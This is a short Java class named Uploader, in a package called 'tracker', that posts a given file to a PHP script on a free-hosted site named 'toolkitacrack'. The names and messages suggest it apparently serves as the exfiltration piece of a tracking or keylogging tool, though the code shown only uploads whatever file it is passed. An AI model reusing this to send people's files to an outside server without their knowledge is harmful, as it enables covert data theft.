package tracker;

import java.io.File;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.ContentBody;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;


@SuppressWarnings("deprecation")
public class Uploader{
	public static void upload(String file_name) throws Exception {
		HttpClient httpclient = new DefaultHttpClient();
		httpclient.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
		//HttpPost httppost = new HttpPost("http://localhost/toolkitcrack/uthao/uthao.php");
		HttpPost httppost = new HttpPost("https://toolkitacrack.000webhostapp.com/toolkitcrack/uthao/uthao.php");
		File file = new File(file_name);
		MultipartEntity mpEntity = new MultipartEntity();
		ContentBody contentFile = new FileBody(file);
		mpEntity.addPart("userfile", contentFile);
		httppost.setEntity(mpEntity);
		System.out.println("Executing request to -->" + httppost.getRequestLine()+"<--");
		HttpResponse response = httpclient.execute(httppost);
		HttpEntity resEntity = response.getEntity(); 

		if((response.getStatusLine().toString()).equals("HTTP/1.1 200 OK")){
			// Successfully Uploaded
			System.out.println("Boss we are done.!");
		}
		else{
			System.out.println("Boss we are on trouble.!");
			// Did not upload. 
		}
		System.out.println("Response: "+response.getStatusLine());
		if (resEntity != null) {
			System.out.println(EntityUtils.toString(resEntity));
			resEntity.consumeContent();
		}
		httpclient.getConnectionManager().shutdown();
	}
/*
	public static void main(String[] args)
	{
		try {
			Uploader.upload("C:\\Users\\HP\\Desktop\\Desire2.txt");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}*/
}